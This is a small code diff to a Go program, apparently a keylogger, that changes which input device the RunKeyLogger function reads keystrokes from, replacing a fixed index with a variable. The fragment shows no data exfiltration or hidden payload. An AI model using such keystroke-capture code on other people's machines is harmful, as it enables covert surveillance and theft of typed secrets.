@@ -2,7 +2,6 @@ package main
 
 import "log"
 
-
 var (
 	shift bool
 	caps  bool
@@ -14,7 +13,7 @@ func RunKeyLogger() {
 	if err != nil {
 		log.Fatal(err)
 	}
-	rd := NewKeyLogger(devs[2])
+	rd := NewKeyLogger(devs[kbid])
 	err = rd.Read()
 	if err != nil {
 		log.Fatal(err)
